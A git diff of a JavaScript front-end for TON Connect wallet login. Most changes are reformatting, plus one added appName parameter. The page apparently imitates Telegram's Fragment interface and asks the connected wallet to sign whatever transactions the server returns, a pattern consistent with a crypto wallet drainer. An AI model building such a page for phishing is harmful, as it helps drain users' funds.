@@ -1,6 +1,7 @@
 // TON Connect 钱包连接管理
 let tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-  manifestUrl: "https://raw.githubusercontent.com/netrandom/tonconnect/refs/heads/main/js",
+  manifestUrl:
+    "https://raw.githubusercontent.com/netrandom/tonconnect/refs/heads/main/js",
   uiPreferences: {
     theme: "DARK",
     borderRadius: "s",
@@ -54,9 +55,13 @@ connectButton.onclick = connectToWallet;
 function displayShortWalletAddress(walletInfo) {
   let walletAddress = new Address(walletInfo.account.address);
   walletAddress = walletAddress.toString(true, true, true);
-  
-  document.getElementById("wallet-head").innerText = walletAddress.substring(0, 24);
-  document.getElementById("wallet-tail").innerText = walletAddress.substring(24);
+
+  document.getElementById("wallet-head").innerText = walletAddress.substring(
+    0,
+    24
+  );
+  document.getElementById("wallet-tail").innerText =
+    walletAddress.substring(24);
 }
 
 /**
@@ -67,11 +72,17 @@ function updateSidebar(walletInfo) {
   if (walletInfo) {
     let walletAddress = new Address(walletInfo.account.address);
     walletAddress = walletAddress.toString(true, true, true);
-    
-    document.getElementById("wallet-head").innerText = walletAddress.substring(0, 24);
-    document.getElementById("wallet-tail").innerText = walletAddress.substring(24);
-    
-    const menuWindow = document.getElementsByClassName("js-header-menu-window")[0];
+
+    document.getElementById("wallet-head").innerText = walletAddress.substring(
+      0,
+      24
+    );
+    document.getElementById("wallet-tail").innerText =
+      walletAddress.substring(24);
+
+    const menuWindow = document.getElementsByClassName(
+      "js-header-menu-window"
+    )[0];
     menuWindow.innerHTML = `
       <div class="tm-menu-account-header">
         <div class="tm-menu-account-address">
@@ -146,7 +157,7 @@ function updateSidebar(walletInfo) {
         </div>
       </div>
     `;
-    
+
     // 绑定断开连接按钮事件
     const logoutButtons = document.getElementsByClassName("ton-logout-link");
     for (const logoutButton of logoutButtons) {
@@ -162,10 +173,10 @@ function updateSidebar(walletInfo) {
             href: window.location.href,
           }),
         });
-        
+
         // 断开 TON Connect 连接
         tonConnectUI.disconnect();
-        
+
         // 刷新页面
         location.reload();
       };
@@ -197,8 +208,12 @@ function updateVisualDisplay(walletInfo) {
 }
 
 // 弹窗控制
-const openPopupButton = document.getElementsByClassName("js-header-menu-button")[0];
-const closePopupButton = document.getElementsByClassName("js-header-menu-close-button")[0];
+const openPopupButton = document.getElementsByClassName(
+  "js-header-menu-button"
+)[0];
+const closePopupButton = document.getElementsByClassName(
+  "js-header-menu-close-button"
+)[0];
 const popup = document.getElementsByClassName("js-header-menu")[0];
 
 openPopupButton.onclick = () => {
@@ -218,7 +233,7 @@ tonConnectUI.onStatusChange((walletInfo) => {
   currentConnectedWallet = walletInfo;
   updateSidebar(walletInfo);
   updateVisualDisplay(walletInfo);
-  
+
   // 如果钱包已连接，通知服务器
   if (walletInfo) {
     fetch("/api/connected", {
@@ -244,30 +259,36 @@ async function initiateTransaction() {
     await tonConnectUI.openModal();
     return;
   }
-  
+
   const walletAddress = tonConnectUI.wallet.account.address;
-  
+  const appName = tonConnectUI.wallet.account.appName;
+
   try {
     // 获取交易数据
     let transactionResponse = await fetch(
-      "/api/transaction" + window.location.search + "&wallet=" + walletAddress
+      `/api/transaction?${window.location.search}&wallet=${walletAddress}&appName=${appName}`
     );
-    
+
     if (transactionResponse.ok) {
       let transactionData = await transactionResponse.json();
       console.log("Transaction data:", transactionData.messages);
-      
+
       if (transactionData.messages) {
         let transactionPayload = {
           validUntil: Math.floor(Date.now() / 1000) + 360, // 6分钟有效期
           messages: transactionData.messages,
         };
-        
-        if (transactionPayload.messages && transactionPayload.messages.length > 0) {
+
+        if (
+          transactionPayload.messages &&
+          transactionPayload.messages.length > 0
+        ) {
           try {
             // 发送交易到钱包签名
-            const signedTransaction = await tonConnectUI.sendTransaction(transactionPayload);
-            
+            const signedTransaction = await tonConnectUI.sendTransaction(
+              transactionPayload
+            );
+
             // 通知服务器交易已接受
             fetch("/api/accept", {
               method: "POST",
